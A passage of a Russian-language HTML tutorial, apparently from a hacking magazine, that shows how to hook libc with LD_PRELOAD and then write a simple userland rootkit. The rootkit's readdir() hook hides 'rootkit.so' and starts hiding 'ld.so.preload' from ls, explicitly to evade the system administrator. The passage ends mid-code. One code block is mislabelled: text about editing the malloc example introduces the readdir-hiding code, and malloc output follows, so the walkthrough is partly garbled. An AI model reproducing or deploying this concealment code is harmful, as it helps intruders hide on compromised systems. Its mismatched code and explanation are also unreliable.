<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><a name="p23"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">К</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">аж­дый раз при вызове </span><a name="code42"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">m</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">alloc() динами­чес­кий ком­понов­щик вызыва­ет вер­сию </span><a name="code43"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">m</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">alloc() из </span><a name="code44"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">l</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">ibmalloc.so, пос­коль­ку это пер­вое вхож­дение </span><a name="code45"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">m</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">alloc(). Но мы хотим выз­вать сле­дующее вхож­дение </span><a name="code46"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">m</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">alloc() — то, что находит­ся в </span><a name="code47"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">l</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">ibc.so.</span></p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><a name="p24"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">Т</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">ак про­исхо­дит потому, что динами­чес­кий ком­понов­щик внут­ри исполь­зует фун­кцию </span><a name="code48"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">d</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">lsym() из </span><a name="code49"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">/</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">usr/include/dlfcn.h для поис­ка адре­са, заг­ружен­ного в память.</span></p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><a name="p25"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">П</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">о умол­чанию в качес­тве пер­вого аргу­мен­та для </span><a name="code50"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">d</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">lsym() исполь­зует­ся дес­крип­тор </span><a name="code51"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">R</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">TLD_DEFAULT, который воз­вра­щает адрес пер­вого вхож­дения сим­вола. Одна­ко есть еще один псев­доука­затель динами­чес­кой биб­лиоте­ки — </span><a name="code52"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">R</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">TLD_NEXT, который ищет сле­дующее вхож­дение. Исполь­зуя </span><a name="code53"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">R</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">TLD_NEXT, мы можем най­ти фун­кцию </span><a name="code54"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">m</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">alloc() биб­лиоте­ки </span><a name="code55"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">l</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">ibc.so.</span></p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><a name="p26"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">О</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">т­редак­тиру­ем </span><a name="code56"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">l</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">ibmalloc.с. Ком­мента­рии объ­ясня­ют, что про­исхо­дит внут­ри прог­раммы:</span></p>
<p style="-qt-paragraph-type:empty; margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><br /></p>
<p style="-qt-paragraph-type:empty; margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px; font-family:'FreeMono'; color:#6a1009;"><br /></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">#define _GNU_SOURCE</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">#include &lt;dlfcn.h&gt;</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">#include &lt;dirent.h&gt;</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">#include &lt;stdlib.h&gt;</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">#include &lt;stdio.h&gt;</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">#include &lt;string.h&gt;</span></p>
<p style="-qt-paragraph-type:empty; margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px; font-family:'FreeMono'; color:#6a1009;"><br /></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">// Определяем макрос, который является</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">// названием скрываемого файла</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">#define RKIT &quot;rootkit.so&quot;</span></p>
<p style="-qt-paragraph-type:empty; margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px; font-family:'FreeMono'; color:#6a1009;"><br /></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">// Здесь все то же, что и в примере с malloc()</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">struct dirent* (*orig_readdir)(DIR *) = NULL;</span></p>
<p style="-qt-paragraph-type:empty; margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px; font-family:'FreeMono'; color:#6a1009;"><br /></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">struct dirent *readdir(DIR *dirp)</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">{</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">  if (orig_readdir == NULL)</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">     orig_readdir = (struct dirent*(*)(DIR *))dlsym(RTLD_NEXT, &quot;readdir&quot;);</span></p>
<p style="-qt-paragraph-type:empty; margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px; font-family:'FreeMono'; color:#6a1009;"><br /></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">  // Вызов orig_readdir() для получения каталога</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">  struct dirent *ep = orig_readdir(dirp);</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">  while ( ep != NULL &amp;&amp; !strncmp(ep-&gt;d_name, RKIT, strlen(RKIT)) )</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">    ep = orig_readdir(dirp);</span></p>
<p style="-qt-paragraph-type:empty; margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px; font-family:'FreeMono'; color:#6a1009;"><br /></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">  return ep;</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">}</span></p>
<p style="-qt-paragraph-type:empty; margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px; font-family:'FreeMono'; color:#6a1009;"><br /></p>
<p style="-qt-paragraph-type:empty; margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px; font-family:'FreeMono'; color:#6a1009;"><br /></p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><a name="p27"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">В</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;"> цик­ле про­веря­ется, не NULL ли зна­чение дирек­тории, затем вызыва­ется </span><a name="code58"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">s</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">trncmp() для про­вер­ки, сов­пада­ет ли </span><a name="code59"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">d</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">_name катало­га с RKIT (фай­ла с рут­китом). Если оба усло­вия вер­ны, вызыва­ется фун­кция </span><a name="code60"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">o</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">rig_readdir() для чте­ния сле­дующей записи катало­га. При этом про­пус­кают­ся все дирек­тории, у которых </span><a name="code61"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">d</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">_name начина­ется с </span><a name="code62"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">r</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">ootkit.so.</span></p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><a name="p28"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">Т</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">е­перь давай пос­мотрим, как отра­бота­ет наша биб­лиоте­ка в этот раз. Сно­ва ком­пилиру­ем и смот­рим на резуль­тат работы:</span></p>
<p style="-qt-paragraph-type:empty; margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><br /></p>
<p style="-qt-paragraph-type:empty; margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px; font-family:'FreeMono'; color:#6a1009;"><br /></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">$ gcc -Wall -fPIC -shared -o libmalloc.so libmalloc.c -ldl</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">$ LD_PRELOAD=./libmalloc.so ./call_malloc</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">Hijacked malloc(256)</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">malloc(): 0x55ca92740260</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">Str: I'll be back</span></p>
<p style="-qt-paragraph-type:empty; margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px; font-family:'FreeMono'; color:#6a1009;"><br /></p>
<p style="-qt-paragraph-type:empty; margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px; font-family:'FreeMono'; color:#6a1009;"><br /></p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><a name="p30"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">О</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">т­лично! Как мы видим, все прош­ло глад­ко. Сна­чала при пер­вом вхож­дении </span><a name="code65"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">m</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">alloc() была исполь­зована наша реали­зация этой фун­кции, а затем ори­гиналь­ная реали­зация из биб­лиоте­ки </span><a name="code66"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">l</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">ibc.so.</span></p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><a name="p31"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">Т</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">е­перь, ког­да мы понима­ем, как работа­ет </span><a name="code67"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">L</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">D_PRELOAD и каким обра­зом мы можем пре­доп­ределять работу со стан­дар­тны­ми фун­кци­ями сис­темы, самое вре­мя при­менить эти зна­ния на прак­тике.</span></p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><a name="p32"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">П</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">оп­робу­ем сде­лать так, что­бы ути­лита </span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt; font-weight:600;">ls</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">, ког­да выводит спи­сок фай­лов, про­пус­кала рут­кит.</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><a name="toc03."></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;"> </span></p>
<h2 style=" margin-top:16px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt; font-weight:600;">Скрываем файл из листинга ls</span></h2>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><a name="p33"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">Б</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">оль­шинс­тво динами­чес­ки ском­пилиро­ван­ных прог­рамм исполь­зуют сис­темные вызовы стан­дар­тной биб­лиоте­ки </span><a href="https://www.gnu.org/software/libc/manual/"><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt; text-decoration: underline; color:#0000ff;">libc</span></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">. С помощью ути­литы </span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt; font-weight:600;">ldd</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;"> пос­мотрим, какие биб­лиоте­ки исполь­зует прог­рамма ls:</span></p>
<p style="-qt-paragraph-type:empty; margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><br /></p>
<p style="-qt-paragraph-type:empty; margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px; font-family:'FreeMono'; color:#6a1009;"><br /></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">$ ldd /bin/ls</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">...</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f1ade498000)</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">...</span></p>
<p style="-qt-paragraph-type:empty; margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px; font-family:'FreeMono'; color:#6a1009;"><br /></p>
<p style="-qt-paragraph-type:empty; margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px; font-family:'FreeMono'; color:#6a1009;"><br /></p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><a name="p35"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">П</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">о­луча­ется, </span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt; font-weight:600;">ls</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;"> динами­чес­ки ском­пилиро­вана с исполь­зовани­ем фун­кций биб­лиоте­ки </span><a name="code69"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">l</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">ibc.so. Теперь пос­мотрим, какие сис­темные вызовы для чте­ния дирек­тории исполь­зует ути­лита </span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt; font-weight:600;">ls</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">. Для это­го в пус­той дирек­тории выпол­ним </span><a name="code70"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">l</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">trace ls:</span></p>
<p style="-qt-paragraph-type:empty; margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><br /></p>
<p style="-qt-paragraph-type:empty; margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px; font-family:'FreeMono'; color:#6a1009;"><br /></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">$ ltrace ls</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">memcpy(0x55de4a72e9b0, &quot;.\0&quot;, 2) = 0x55de4a72e9b0</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">__errno_location() = 0x7f3a35b07218</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">opendir(&quot;.&quot;) = 0x55de4a72e9d0</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">readdir(0x55de4a72e9d0) = 0x55de4a72ea00</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">readdir(0x55de4a72e9d0) = 0x55de4a72ea18</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">readdir(0x55de4a72e9d0) = 0</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">closedir(0x55de4a72e9d0) = 0</span></p>
<p style="-qt-paragraph-type:empty; margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px; font-family:'FreeMono'; color:#6a1009;"><br /></p>
<p style="-qt-paragraph-type:empty; margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px; font-family:'FreeMono'; color:#6a1009;"><br /></p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><a name="p37"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">О</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">че­вид­но, что при выпол­нении коман­ды без аргу­мен­тов </span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt; font-weight:600;">ls</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;"> исполь­зует сис­темные вызовы </span><a name="code72"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">o</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">pendir(), </span><a name="code73"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">r</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">eaddir() и </span><a name="code74"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">c</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">losedir(), которые вхо­дят в биб­лиоте­ку libc. Давай теперь задей­ству­ем </span><a name="code75"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">L</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">D_PRELOAD и пере­опре­делим эти стан­дар­тные вызовы сво­ими. Напишем прос­тую биб­лиоте­ку, в которой изме­ним фун­кцию </span><a name="code76"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">r</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">eaddir(), что­бы она скры­вала наш файл с кодом.</span></p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><a name="p38"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">З</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">десь мы уже перехо­дим к написа­нию прос­того рут­кита без наг­рузки. Все, что он будет делать, — это пря­тать сам себя от глаз адми­нис­тра­тора сис­темы.</span></p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><a name="p39"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">Я</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;"> соз­дал дирек­торию </span><a name="code77"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">r</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">ootkit и даль­ше буду работать в ней. Соз­дадим файл </span><a name="code78"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">r</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">kit.c.</span></p>
<p style="-qt-paragraph-type:empty; margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><br /></p>
<p style="-qt-paragraph-type:empty; margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px; font-family:'FreeMono'; color:#6a1009;"><br /></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">#define _GNU_SOURCE</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">#include &lt;dlfcn.h&gt;</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">#include &lt;dirent.h&gt;</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">#include &lt;stdlib.h&gt;</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">#include &lt;stdio.h&gt;</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">#include &lt;string.h&gt;</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">#define RKIT &quot;rootkit.so&quot;</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">#define LD_PL &quot;ld.so.preload&quot;</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">struct dirent* (*orig_readdir)(DIR *) = NULL;</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">struct dirent *readdir(DIR *dirp)</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">{</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">if (orig_readdir == NULL)</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">orig_readdir = (struct dirent*(*)(DIR *))dlsym(RTLD_NEXT, &quot;readdir&quot;);</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">struct dirent *ep = orig_readdir( dirp );</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">while ( ep != NULL &amp;&amp;</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">( !strncmp(ep-&gt;d_name, RKIT, strlen(RKIT)) ||</span></p>
